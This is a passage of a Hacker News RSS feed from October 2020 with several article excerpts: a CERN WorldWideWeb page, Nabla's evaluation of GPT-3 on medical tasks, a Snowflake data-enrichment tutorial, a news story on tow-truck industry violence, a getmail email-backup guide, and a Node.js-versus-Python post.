									<dd>Text which is not constrained to be linear.</dd>
								</p>
								<p>
									<dt>HyperMedia:</dt>
									<dd>Information which is not constrained linear... or to be text.</dd>
								</p>
							</dl>
						</div>
						<div>
							<div>
								<div>
									<div>
									<p>This is the first version of the NextStep WorldWideWeb application
								 like the libWWW Library. <br>
								 It can pick up hypertext information from files in a number of formats, from local files, from remote files using NFS 
								 or anonymous FTP, from hypertext servers by name or keyword search, and from internet news.<br>
								 Hypertext files may be edited, and links made from hypertext files to other files or any other information.
								 <br>
								 </p><p>For more help, use "Help" from the menu. If that doesn't work, then your application has been incompletely installed.
								 </p><p>If you have any comments or have bugs, please mail timbl@info.cern.ch quoting the version number
								 (above).</p>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</section>

	<section>
		<h3 id="style-editor-section">Style Editor</h3>
		
	</section>
</section>

<!--

<section>

No images. Three levels of grey.


</section>

<section>
<img src="/images/screenshots/image2.png" alt="A style editor from the NeXT Cube computer" />
<img src="/images/screenshots/image7.png" alt="A style editor from the NeXT Cube computer" />
<img src="/images/screenshots/image11.png" alt="Document inspector from the NeXT Cube computer" />
<img src="/images/screenshots/image15.png" alt="Info Window for NeXT Cube computer's Hypermedia browser / editor with a Nexus" />
<img src="/images/screenshots/image21.png" alt="Reading news from the NeXT Cube computer's Nexus browser" />
</section>
-->


  </div></div>]]>
            </description>
            <link>https://worldwideweb.cern.ch/worldwideweb/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24955122</guid>
            <pubDate>Sat, 31 Oct 2020 20:55:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doctor GPT-3: hype or reality?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954871">thread link</a>) | @headalgorithm
<br/>
October 31, 2020 | https://www.nabla.com/blog/gpt-3/ | <a href="https://web.archive.org/web/*/https://www.nabla.com/blog/gpt-3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>You may have heard about GPT-3 this summer, the new cool kid on the AI block. GPT-3 came out of OpenAI, one of the top AI research labs in the world which was founded in late 2015 by Elon Musk, Sam Altman and others and later backed with a $1B investment from Microsoft.</p>
<p>You’ve probably also heard about the ongoing AI revolution in healthcare, thanks to promising results in areas such as automated diagnosis, medical documentation and drug discovery, to name a few.
Some have claimed that algorithms now outperform doctors on <a href="https://hbr.org/2019/10/ai-can-outperform-doctors-so-why-dont-patients-trust-it">certain tasks</a> and others have even announced that robots will soon receive <a href="https://www.forbes.com/sites/insights-intelai/2018/09/21/the-ultimate-physicians-assistant/">medical degrees</a> of their own! This can all sound far-fetched... but could this robot actually be GPT-3?</p>
<p>Our unique multidisciplinary team of doctors and machine learning engineers at Nabla had the chance to test this new model to tease apart what’s real and what’s hype by exploring different healthcare use cases.</p>
<p><img src="https://www.nabla.com/uploads/gp0.jpg" alt="Primary care and GPT-3"></p>
<h2>But first, coffee</h2>
<p>In machine learning, a language model like GPT-3 simply tries to predict a word in a sentence given the previous words, called the context. It’s a supercharged autocomplete system like the one you may use with Gmail. Being able to predict the next word in a sentence seems deceptively simple at first, but this actually enables many compelling use cases, such as chatbots, translation or Q&amp;A.</p>
<p>At the time of writing, GPT-3 is the most complex language model ever trained, with a whopping 175 billion parameters in total - that’s as many knobs that are fine-tuned over weeks of intensive cloud computing to make the AI magic work. Certainly a huge number, but still way below the 100 (or maybe 1000+) trillion synapses in the human brain that enable reasoning, perception and emotions.</p>
<p>Thanks to the large size of the model, GPT-3 can be applied on new tasks and ‘few-shot’ demonstrations without any further fine-tuning on specific data. In practice, this means the model can successfully understand the task to perform with only a handful of initial examples. This property is a huge improvement compared to previous, less complex language models, and is much closer to actual human behavior - we don’t need thousands of examples to distinguish a cat from a dog.</p>
<p>Despite obvious biases learned from the data used for training - basically books plus the whole Internet, from Wikipedia to the New York Times - GPT-3's ability to transform natural language into websites, create basic financial reports, solve langage puzzles, or even generate guitar tables has been very promising so far. But what about healthcare?</p>
<h2>Then, the obvious disclaimer</h2>
<p>As Open AI itself warns in GPT-3 guidelines, healthcare “is in the high stakes category because people rely on accurate medical information for life-or-death decisions, and mistakes here could result in serious harm”. Furthermore, diagnosing medical or psychiatric conditions falls straight in the “unsupported use” of the model. Despite this we wanted to give it a shot and see how it does on the following healthcare use cases, roughly ranked from low to high sensitivity from a medical perspective: admin chat with a patient, medical insurance check, mental health support, medical documentation, medical questions &amp; answers and medical diagnosis. We also looked at the impact of some parameters of the model on the answers - spoiler alert, it’s fascinating!</p>
<h2>GPT-3, your next medical assistant?</h2>
<p>Our first tests showed that GPT-3 seemed to work for basic admin tasks such as appointment booking, but when digging a bit we found that the model had no clear understanding of time, nor any proper logic. Its memory also sometimes fell short - for the appointment in the example below, the patient’s initial 6pm constraint is overlooked as GPT-3 suggests booking for 7pm after a few messages.</p>
<p><img src="https://www.nabla.com/uploads/gp1.jpg" alt="Medical assistant example with GPT-3"></p>
<h2>What about insurance checks?</h2>
<p>Similar to the admin tasks above, GPT-3 could help nurses or patients to quickly find a piece of information in a very long document, like finding insurance benefits for specific medical examinations. In the example below we seeded the model with a 4-page standard benefits table that shows a $10 copay for an X-ray, $20 for an MRI exam, and then asked 2 simple questions. GPT-3 was able to get the copay for an X-ray but could not sum up the copays for several exams, which again highlights a lack of basic reasoning.</p>
<p><img src="https://www.nabla.com/uploads/gp2.jpg" alt="Insurance checks example with GPT-3"></p>
<h2>Recycle to relieve stress!</h2>
<p>Relax on your living room sofa and talk, GPT-3 will listen to your problems endlessly and may even give you some actionable tips! This is probably one of the best use cases for GPT-3 in healthcare, and it’s not so surprising given the already good results from the Eliza algorithm back in 1966, which managed to give a human touch with only pattern matching rules operating behind the scenes.</p>
<p>One key difference between the two approaches though is that rule-based systems like Eliza were in full control of the computer’s response. In other words, we are certain that nothing potentially harmful could be said.</p>
<p>This contrasts with the example below in which GPT-3 sadly tells us that committing suicide is a good idea…</p>
<p><img src="https://www.nabla.com/uploads/gp4.jpg" alt="Kill switch example with GPT-3"></p>
<p>The model can also shoot unexpected answers where it suggests recycling more to ease stress - using a rationale which, while being convoluted, is actually quite sensible!</p>
<p><img src="https://www.nabla.com/uploads/gp3.jpg" alt="Recycling and stress example with GPT-3"></p>
<h2>Medical documentation</h2>
<p>GPT-3 has already shown promising results in summarizing and simplifying text, something that could be very useful for patients to understand medical reports often full of jargon, or for doctors to quickly get the gist of a patient’s long medical history. Well, GPT-3 is probably not quite ready for this (yet?). Our tests show dangerous oversimplifications, difficulties to associate causes and consequences, and once again a lack of basic deductive reasoning.</p>
<h2>Medical Q&amp;A: not as good as good ol’ Google yet</h2>
<p>When looking for specific scientific information, drug dosages or prescription support, our experiments show that GPT-3 is not reliable enough to be safely used as a trustworthy support tool for doctors. One serious concern is that GPT-3 very often gives wrong yet grammatically correct answers, with no scientific reference that a physician could check. A tired doctor caught in the rush of an emergency department could easily confuse a syntactically sound statement for a medically valid one. For example the first answer below is correct but not the second.</p>
<p><img src="https://www.nabla.com/uploads/gp5.jpg" alt="Q&amp;A medical example with GPT-3"></p>
<h2>Diagnosis: at your own risk</h2>
<p>A more complex Q&amp;A task is diagnosis: input symptoms and get possible underlying conditions that may explain these symptoms. Recent symptom checker systems (Babylon, Ada, KHealth, etc.), if not perfect, seem to be a better option here than GPT-3 as they’ve been carefully optimized for this sole purpose. One benefit of these systems is that they can output different diagnoses with their probabilities, which acts as a measure of confidence for the practitioner. If the first diagnosis example below GPT-3 ignores the fever of the little girl that suggests ethmoiditis and mentions a “rash” that does not exist.</p>
<p><img src="https://www.nabla.com/uploads/gp6.jpg" alt="Medical diagnosis 1 example with GPT-3"></p>
<p>In another test, GPT-3 misses a pulmonary embolism. Fortunately nobody died here!</p>
<p><img src="https://www.nabla.com/uploads/gp7.jpg" alt="Medical diagnosis 2 example with GPT-3"></p>
<h2>Under the hood</h2>
<p>As others have observed, the quality of GPT-3 outputs is much impacted by the seed words used - the same question formulated in two different ways can result in very different answers. The model’s various parameters, such as the temperature and the top P also play a big role. Temperature and top P control the risks and creativity that the engine will exhibit in its answers.</p>
<h3>Temperature</h3>
<p>For the same input and a high temperature we get two answers with very different tones telling two opposite things. Here is an example with T = 0.9.</p>
<p><img src="https://www.nabla.com/uploads/gp8.jpg" alt="High temperature parameter and GPT-3"></p>
<p>By contrast, a similar seed with a very low temperature (T = 0) will always result in the same and quite straightforward answer.</p>
<p><img src="https://www.nabla.com/uploads/gp9.jpg" alt="Low temperature parameter and GPT-3"></p>
<h3>Frequency penalty and presence penalty</h3>
<p>It is also pertinent to mention the frequency penalty and presence penalty parameters, which prevent both word repetition and subject repetition. In a medical context, the intuition would be to reduce them as much as possible since a too abrupt subject switch can be very confusing and repetition can actually be pedagogical. However, comparing two conversations where the human asks the same questions, we clearly observe that the model with repetition penalties seems more empathic and friendly than the other one which appears cold and too repetitive to be human. Here is an example with no penalty.</p>
<p><img src="https://www.nabla.com/uploads/gp10.jpg" alt="No penalty parameter and GPT-3"></p>
<p>And an example with full penalty.</p>
<p><img src="https://www.nabla.com/uploads/gp11.jpg" alt="Full penalty parameter and GPT-3"></p>
<h2>Conclusion</h2>
<p>As warned by OpenAI, we are nowhere near any real time scenario where GPT-3 would significatively help in healthcare. Because of the way it was trained, it lacks the scientific and medical expertise that would make it useful for medical documentation, diagnosis support, treatment recommendation or any medical Q&amp;A. Yes, GPT-3 can be right in its answers but it can also be very wrong, and this inconsistency is just not viable in healthcare. Even for more administrative tasks such as translating or summarizing medical jargon, GPT-3 while promising is still many moons away for a production use case actually supporting doctors. We’re still in this phase where multiple, narrow-task supervised models win over a single, very ambitious approach.</p>
<p>That being said, GPT-3 seems to be quite ready to fight burnout and help doctors with a chit-chat module. It could bring back the joy and empathy you would get from a conversation with your medical residents at the end of the day, that conversation that helps you come down to earth at the end of a busy day. Also, there is no doubt that language models in general will be improving at a fast pace, with a positive impact not only on the use cases described above but also on other important problems, such as information structuring and normalisation or automatic consultation summaries.</p>
<p>And at Nabla, we are working on it!<br>
<strong><em>Thanks to Megan Mahoney (Clinical Professor at Stanford University School of Medicine and Chief of Staff of Stanford Health Care) and Yann LeCun for reading drafts of …</em></strong></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.nabla.com/blog/gpt-3/">https://www.nabla.com/blog/gpt-3/</a></em></p>]]>
            </description>
            <link>https://www.nabla.com/blog/gpt-3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954871</guid>
            <pubDate>Sat, 31 Oct 2020 20:19:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Enrich Your Snowflake Data Using External Functions]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954860">thread link</a>) | @knes
<br/>
October 31, 2020 | https://blog.getcensus.com/data-enrichment-without-leaving-the-warehouse/ | <a href="https://web.archive.org/web/*/https://blog.getcensus.com/data-enrichment-without-leaving-the-warehouse/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <section>
                <div>
                    <p><a href="https://www.snowflake.com/data-warehousing-glossary/data-enrichment/">Data enrichment</a> is a powerful technique for adding valuable context to your customer data, and it’s simple in theory – given a bit of data about a record (e.g. a user's email or the IP of a web session), tell me more information about it so I can take effective action (e.g. map the email domain to a company or map the IP to a geolocation). In practice, however, it can be difficult to integrate a data enrichment process into an existing ELT pipeline, for a few reasons:</p><ul><li><strong>Maintaining Freshness: </strong>How recent are the results being correlated with my data? This may be a function of how often external datasets are loaded or how up-to-date your third-party data provider’s information is.</li><li><strong>Ensuring Consistency: </strong>Once data is enriched with new attributes, can I easily push those attributes to my warehouse and SaaS tools to maintain a synchronized data model?</li><li><strong>Limiting Resource Usage: </strong>Enrichment processes can be expensive in storage costs (to maintain huge third-party data sets), processing time, and API quota usage for paid enrichment services. And enrichment processes shouldn’t unnecessarily repeat the same work over and over again.</li></ul><p>In this post, I’ll share our recipe for enriching our own customer data at Census using the <a href="https://clearbit.com/" rel="noreferrer nofollow noopener">Clearbit</a> API, Snowflake External Functions, and <a href="https://www.getdbt.com/product/" rel="noreferrer nofollow noopener">dbt</a> to enrich data correctly and efficiently over large data sets.</p><p>One note before we begin, if you’re new to data enrichment: there’s a key difference between enriching using a dataset and enriching using an API. Some enrichment pipelines make use of third party datasets that can be purchased in their entirety – you can see many examples of these in the <a href="https://www.snowflake.com/data-marketplace/" rel="noreferrer nofollow noopener">Snowflake Data Marketplace</a>. This kind of data can be easier to work with because you can rely on your warehouse to efficiently <code>LEFT JOIN</code> to these datasets and materialize the result on a schedule. However, an enrichment API doesn’t give you the full dataset to work with; it replies to your queries (one at a time or in bulk) in a request-reply style to tell you if the API has additional data for the company or person in question. These are more challenging to work with in a data warehousing context, and we built this pipeline so that we can perform both types of enrichment without leaving the comfort of our warehouse SQL environment.</p><h3 id="snowflake-s-external-functions">Snowflake's External Functions</h3><p>External functions are a recentaddition in modern data warehouses. An external function is like a traditional <a href="https://docs.snowflake.com/en/sql-reference/user-defined-functions.html">user-defined function (UDF)</a>, but it allows you to break free of the database sandbox by calling an external handler to calculate results. For example, Redshift has basic support for <a href="https://docs.aws.amazon.com/redshift/latest/dg/r_CREATE_EXTERNAL_FUNCTION.html" rel="noreferrer nofollow noopener">external functions</a> that call Lambda functions to compute their results.</p><p>Snowflake's <a href="https://docs.snowflake.com/en/sql-reference/external-functions-introduction.html" rel="noreferrer nofollow noopener">external functions</a> call out to an <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html" rel="noreferrer nofollow noopener">AWS API Gateway</a> endpoint to retrieve results, which allows us to connect many different handlers, including Lambda functions. Calls from SQL will be batched into JSON HTTP requests and proxied to the configured handler, which needs to unwrap the batch items, calculate appropriate values, and then return a batch of results as JSON. Setting up a gateway and handlers in AWS for the first time isn’t trivial, but the design allows a lot of flexibility. I won't go through that process in this post but you can read about it in Snowflake's <a href="https://docs.snowflake.com/en/sql-reference/external-functions-creating-aws.html" rel="noreferrer nofollow noopener">documentation</a>. We automate this using a <a href="https://www.terraform.io/" rel="noreferrer nofollow noopener">Terraform</a> module, which we hope to open source soon. Feel free to contact us if you’re curious!</p><figure><img src="https://blog.getcensus.com/content/images/2020/10/04r4gr_Q.png" alt="" srcset="https://blog.getcensus.com/content/images/size/w600/2020/10/04r4gr_Q.png 600w, https://blog.getcensus.com/content/images/size/w1000/2020/10/04r4gr_Q.png 1000w, https://blog.getcensus.com/content/images/2020/10/04r4gr_Q.png 1374w" sizes="(min-width: 720px) 720px"><figcaption>Architecture diagram of our external functions with backing resources</figcaption></figure><p>Once the remote gateway is set up, we need to set up an API integration in Snowflake and create one or more external functions that use the integration:</p><figure><pre><code>CREATE OR REPLACE API INTEGRATION clearbit_api_integration
  api_provider=aws_api_gateway
  -- This role is created during gateway setup and is the role that a Snowflake-managed user will assume
  api_aws_role_arn='arn:aws:iam::123456789012:role/gateway_access_role'
  api_allowed_prefixes=('https://&lt;gateway-id&gt;.execute-api.us-west-2.amazonaws.com/production')
  enabled=true;
           
CREATE OR REPLACE EXTERNAL FUNCTION clearbit_person(email_col VARCHAR)
  RETURNS VARIANT
  API_INTEGRATION = clearbit_api_integration
  AS 'https://&lt;gateway-id&gt;.execute-api.us-west-2.amazonaws.com/production/clearbit_person';
               
CREATE OR REPLACE EXTERNAL FUNCTION clearbit_company(domain_col VARCHAR)
  RETURNS VARIANT
  API_INTEGRATION = clearbit_api_integration
  AS 'https://&lt;gateway-id&gt;.execute-api.us-west-2.amazonaws.com/production/clearbit_company';</code></pre><figcaption>SQL code to create API integrations</figcaption></figure><p>Once the API Integration and external functions are created, assuming that the backing gateway is configured properly and our Lambda that forwards requests to Clearbit's API is implemented properly, we should be able to call them like any other SQL function:</p><!--kg-card-begin: html--><pre>&gt; SELECT CLEARBIT_PERSON('dave@getcensus.com');                                                                                     
+----------------------------------------------------------------------------------------------------------------------------------+
| CLEARBIT_PERSON('DAVE@GETCENSUS.COM')                                                                                            |
|----------------------------------------------------------------------------------------------------------------------------------|
| {                                                                                                                                |
|   "company": {                                                                                                                   |
|     "category": {                                                                                                                |
|       "industry": null,                                                                                                          |
|       "industryGroup": null,                                                                                                     |
|       "naicsCode": null,                                                                                                         |
|       "sector": null,                                                                                                            |
|       "sicCode": null,                                                                                                           |
|       "subIndustry": null                                                                                                        |
|     },                                                                                                                           |
|     "crunchbase": {                                                                                                              |
|       "handle": null                                                                                                             |
|     },                                                                                                                           |
|     "description": "Census is the easiest way to sync your data warehouse to the apps you use. No engineering favors required.", |
|     "domain": "getcensus.com",                                                                                                   |
|     "domainAliases": [                                                                                                           |
|       "sutrolabs.com"                                                                                                            |
|     ],                                                                                                                           |
|     "emailProvider": false,                                                                                                      |
|     ...                                                                                                                          |
|   },                                                                                                                             |
|   "person": {                                                                                                                    |
|     "avatar": null,                                                                                                              |
|     "bio": null,                                                                                                                 |
|     "email": "dave@getcensus.com",                                                                                               |
|     "emailProvider": false,                                                                                                      |
|     "employment": {                                                                                                              |
|       "domain": "getcensus.com",                                                                                                 |
|       "name": "Census",                                                                                                          |
|       "role": "engineering",                                                                                                     |
|       "seniority": null,                                                                                                         |
|       "subRole": "software_engineer",                                                                                            |
|       "title": "Software Engineer"                                                                                               |
|     },                                                                                                                           |
|     ...                                                                                                   …</pre></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.getcensus.com/data-enrichment-without-leaving-the-warehouse/">https://blog.getcensus.com/data-enrichment-without-leaving-the-warehouse/</a></em></p>]]>
            </description>
            <link>https://blog.getcensus.com/data-enrichment-without-leaving-the-warehouse/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954860</guid>
            <pubDate>Sat, 31 Oct 2020 20:18:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lawyer had to flee the country after taking on the tow truck industry]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954827">thread link</a>) | @luu
<br/>
October 31, 2020 | https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869 | <a href="https://web.archive.org/web/*/https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>TORONTO -- 
	Lisa Carr never thought her work would lead to armed threats, a firebombing, a shooting and a conspiracy to kill her.</p>
<p>
	The Carr Law office is in a nondescript strip mall in Vaughan, Ont., north of Toronto. It’s closed now, after the litigation lawyer says police told her they could no longer protect her.</p>
<p>
	She was shuttled to another country where she spent five long months in hiding. Carr has never before told her story, but agreed to meet for an interview as part of a W5 investigation into the shady underbelly of an industry that forced her to give up her business and almost cost her, her life: The tow truck industry.</p>
<p>
	Over the last number of years, criminal elements have been battling for lucrative control of the major highways around the Toronto area. It has resulted in more than 50 arsons, multiple shootings and at least four murders.</p>
<p>
	So why is there so much violence over a couple of hundred-dollar tows at the side of the road? Because that one tow can net tens of thousands of dollars.</p>
<p>
	Here’s how it works: The tow truck driver gets a kickback from an unscrupulous auto body shop, which then submits wildly inflated repair fees to an insurance company.</p>
<p>
	<img alt="york police" src="https://www.ctvnews.ca/polopoly_fs/1.4954903!/httpImage/image.jpg_gen/derivatives/landscape_960/image.jpg"></p>
<p>
	The insurance industry estimates that fake repair bills tally up to $2 billion a year in Canada. And that’s why Carr was in the crosshairs. She was hired by an insurance company to challenge bogus claims.</p>
<p>
	Over the course of a number of months, Carr’s law firm was the target of increasingly violent attacks. First a firebombing and then her office was set on fire.</p>
<p>
	Months later, in broad daylight, a colleague leaving work had a gun put to her head and was told, “Stop suing our friends.” Shortly after that, again in broad daylight, someone opened fire through the front door of the busy office.</p>
<p>
	Carr says it is incredible no one was struck by the flurry of bullets.</p>
<p>
	“I looked down the hall and I saw my receptionist on her hands and knees surrounded by glass. And one of the other girls came running at me saying, ‘Shots fired, shots fired. Call 911.’”</p>
<p>
	While the violence surrounding the tow truck industry has made headlines in the Greater Toronto Area, the story that has never been told is that York Regional Police (YRP) uncovered a plot to kill Carr.</p>
<p>
	It was such a credible threat that they gave her an hour to pack up her belongings and leave her home. Carr and her husband were then whisked out of the country and spent five months in hiding.</p>
<p>
	Three separate police services – YRP, Toronto Police Service and Ontario Provincial Police – joined forces to launch Project Platinum to investigate the violence associated with the tow truck industry.</p>
<p>
	They carried out a series of raids this past spring, which netted dozens of high-powered weapons and led to the arrests of 35 people who face almost 500 charges, including the attempted murder of Carr.</p>
<p>
	<img alt="weapon" src="https://www.ctvnews.ca/polopoly_fs/1.4954983!/httpImage/image.jpg_gen/derivatives/landscape_960/image.jpg"></p>
<p>
	Now back in Canada, Carr says police have told her she is likely no longer in danger, but with one caveat.</p>
<p>
	“The police said we believe the risk is low. As long as you don't go back to work, as long as you don't restart the firm,” she says.</p>
<p>
	“So they have effectively ended my career. We lost everything. They won.”</p>
                                              </div></div>]]>
            </description>
            <link>https://www.ctvnews.ca/w5/this-toronto-area-lawyer-had-to-flee-the-country-after-taking-on-the-tow-truck-industry-1.5167869</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954827</guid>
            <pubDate>Sat, 31 Oct 2020 20:14:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Backing up emails from an IMAP server]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954798">thread link</a>) | @Artemix
<br/>
October 31, 2020 | https://www.artemix.org/blog/backing-up-e-mails-from-an-imap-server | <a href="https://web.archive.org/web/*/https://www.artemix.org/blog/backing-up-e-mails-from-an-imap-server">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
		<p>E-mail is what connects most people.</p>
<p>It holds most of our accounts, helps us communicate with one another, and can be used for a variety of tasks, including shopping lists, personal notes, and much more.
With that many responsibilities in place, we can surely attest that our mailboxes are both pretty important and sensitive, we should not lose access to them, and we should avoid sharing their contents as much as we can.</p>
<p>Still, running your own e-mail server infrastructure is <em>an absolute pain</em>, for a large variety of reasons, including anti-spam flagging (DKIM, SPF, and other stuff to maintain), blacklists avoidance (because Microsoft and Google are always frisky with their blacklists), and some other problems.</p>
<p>Some choose to handle this cost, resulting in an infrastructure they have <em>absolute control</em> over, and for which they can tailor their backup solutions.
Some others aren't so inclined to partake in such tedious maintenance, and choose instead to put their trust in some companies<sup id="fnref1:1"><a href="#fn:1">1</a></sup>.</p>
<p>Both choices are fine per-se, but they both fall under the same issue: "what happens if my host dies?".
This question could be talking about a temporary network outage, a database corruption issue (data loss), or the service outright dying or blocking you without rescourse.</p>
<p>The common result in all those issues (and many more I haven't mentioned) is that you lose access.
A good idea is to keep a replica of them somewhere, ideally not on the same server used to host them.
Some e-mail services offer automated backups, but since I don't know their backup policy (how the backups are handled, how reliable is the system, and other considerations), I prefer to have my own, which stores files the way I want, in a storage of my liking.</p>
<p>For that, you have multiple solutions and tools you can set up.</p>
<p>The nifty tool <a href="http://pyropus.ca/software/getmail/"><code>getmail</code></a> is the one I chose to go with.
With it, you could for example choose to move your e-mails from your "main" IMAP server to another IMAP server (e.g. the one provided and automatically configured by Synology on their Synology DSM NAS OS shipped with all their NAS), but I chose another solution: to move the e-mails from the main IMAP server to a local storage, i.e. as a list of <a href="http://cr.yp.to/proto/maildir.html">maildir</a>-formatted files.</p>
<p>This allows me to get all my e-mails as text documents on my local computer, so I can access, search, and index them as I wish at any given moment.</p>
<h2>Setting up <code>getmail</code> for local download of e-mails</h2>
<p>The tool <code>getmail</code> is configued by a configuration file stored by default at <code>~/.getmail/getmailrc</code>.
For this example, we'll want to backup our e-mails at <code>~/Documents/my-emails</code>.</p>
<p>The configuration format, as described <a href="http://pyropus.ca/software/getmail/configuration.html">in their documentation</a>, is pretty straightforward in our case.</p>
<p>We want to get our e-mails from the IMAP server our mail provider gives us and save them all in our folder (given above).</p>
<p>We start by configuring our IMAP source.</p>
<pre><code><span>[retriever]</span>
<span>type</span> = SimpleIMAPSSLRetriever
<span>server</span> = mail.my.domain
<span>username</span> = user@mail.my.domain
<span>password</span> = this-is-a-test-password
<span>mailboxes</span> = ALL</code></pre>
<p>We then have to point how and where we want to send them.</p>
<pre><code><span>[destination]</span>
<span>type</span> = MailDir
<span>path</span> = ~/Documents/my-emails</code></pre>
<p>If we run the command <code>getmail</code> right away, we'll notice that it indeed works!
Well, kinda.
The issue here is that every unread e-mail will be flagged as read once the tool handled them, which isn't really what we want...</p>
<p>For this reason, we must add another configuration entry to disable that.</p>
<pre><code><span>[options]</span>
<span>read_all</span> = <span>False</span></code></pre>
<p>And that's it!</p>
<p>You can just throw it in a systemd timer or a crontab, and be done with it, it will silently run and copy all your e-mails the way you want!</p>
<pre><code>*/15 * * * * getmail</code></pre>
<hr>
<p>For reference, this configuration is almost mine, and I chose to put the nifty tool <a href="https://restic.net/"><code>restic</code></a> behind <a href="http://pyropus.ca/software/getmail/"><code>getmail</code></a> to automatically encrypt and backup my e-mails in a snapshot-based backup setup on my NAS in addition to the local clone.</p>

	</article></div>]]>
            </description>
            <link>https://www.artemix.org/blog/backing-up-e-mails-from-an-imap-server</link>
            <guid isPermaLink="false">hacker-news-small-sites-24954798</guid>
            <pubDate>Sat, 31 Oct 2020 20:11:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Chose Node.js over Python for Our Product]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24954559">thread link</a>) | @morchen
<br/>
October 31, 2020 | https://swimm.io/blog/why-we-chose-node-js-over-python-for-our-product/ | <a href="https://web.archive.org/web/*/https://swimm.io/blog/why-we-chose-node-js-over-python-for-our-product/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-2ee12136="" data-v-61c0ab88=""><div><p>Launching a new product is a daunting road of experimentation that requires precision and calibration, like fixing a plane while flying. In our early MVP days (little shorter than a year ago), we started writing our web application with <strong>Vue for the Frontend and Python for the Backend</strong>. Six months later we launched our Alpha product for Swimm, and it was a more robust product that enables an experience for users switching between a CLI and the web app.</p>
<p>As a long time Pythonist, I followed my gut intuition and implemented the first version of our CLI in Python. It was unexpected but, several demos in with our first clients, revealed some major gaps we did not anticipate when starting off.</p>
<h2>Lessons Learned: Node JS vs Python</h2>
<p>It seems that Python and JavaScript <a href="https://medium.com/@xccelerate/python-vs-javascript-which-language-you-should-learn-and-why-cd29c64935c">are especially prevalent</a> among young tech startups - according to <a href="https://userbrain.net/blog/programming-language-startup">Nick Kamyshan</a>, CEO at Chanty, “The Most popular technologies I see startups use today are Python, Java, Ruby, C, Swift, JavaScript, and PHP.”</p>
<p>According to <a href="https://insights.stackoverflow.com/survey/2019#key-results">Stack Overflow’s developer survey in 2019</a>, Python, the fastest-growing major programming language, rising in the ranks of languages and edging out Java in 2020, standing as the second most loved language (after Rust).</p><blockquote>— MIT CSAIL (@MIT_CSAIL) <a href="https://twitter.com/MIT_CSAIL/status/1288515126409060354?ref_src=twsrc%5Etfw">July 29, 2020</a></blockquote> 
<p>While it remains a <strong>heated debate [JS vs Python?]</strong>, I didn’t really perform an in-depth comparison for choosing my go-to language for our CLI. Instead, I just used Python as it was the most intuitive solution for me. Yet as we started Demos with clients, we realized we needed to easily wrap the CLI as a tool that can be run, and distributed to clients.</p>
<p>With Python, <strong>this is not a trivial task</strong>. While it’s theoretically possible to send your Python code as it is, any difference between your environment and the client’s (e.g., different dependencies versions) may cause things to fail. <strong>After searching the web for solutions</strong>, we ended up using <a href="https://www.pyinstaller.org/">PyInstaller</a>.</p>
<p>From the project’s website:</p>
<blockquote>
<p>&gt; PyInstaller freezes (packages) Python applications into stand-alone executables, under Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX.</p>
</blockquote>
<p><img src="https://swimm.io/media/screen-shot-2020-09-02-at-20.13.24.png" alt="Pyinstaller"></p>
<p>It sounded like a really good solution, but it turned out to be far from ideal. Our clients use different OS versions, in order to ship our code to Windows - I had to run Pyinstaller on Windows to ship to OSX - run Pyinstaller on OSX, and so on. While this can be solved with a CI/CD pipeline, things started to feel wrong:</p>
<ul>
<li>For example, one client was using a specific distribution, Ubuntu16.04. I had used Pyinstaller to pack our CLI using Ubuntu 18.04, thinking it would comply with all linux distributions, but little did I know. Reading through <a href="https://pyinstaller.readthedocs.io/en/stable/usage.html">the docs</a>, this seems to be a known issue:</li>
</ul>
<blockquote>
<p>&gt; Under GNU/Linux, PyInstaller does not bundle libc (the C standard library, usually glibc, the Gnu version) with the app. Instead, the app expects to link dynamically to the libc from the local OS where it runs. The interface between any app and libc is forward compatible to newer releases, but it is not backward compatible to older releases.</p>
<p>For this reason, if you bundle your app on the current version of GNU/Linux, it may fail to execute (typically with a runtime dynamic link error) if it is executed on an older version of GNU/Linux.</p>
<p>The solution is to always build your app on the <em>oldest</em> version of GNU/Linux you mean to support. It should continue to work with the libc found on newer versions.</p>
</blockquote>
<ul>
<li>The documentation includes other daunting notes, e.g. “For Python &gt;= 3.5 targeting Windows &lt; 10, the developer needs to take special care”.</li>
</ul>
<p>All in all, I got to realize <strong>this solution isn’t good enough for us</strong>. While Python may be a wonderful language for the backend, it just seems like <strong>the wrong solution for a product that</strong> <strong>needs to run on a client’s machine</strong>, at least in case we don’t want to assume anything about the client’s environment without disclosing our code.</p>
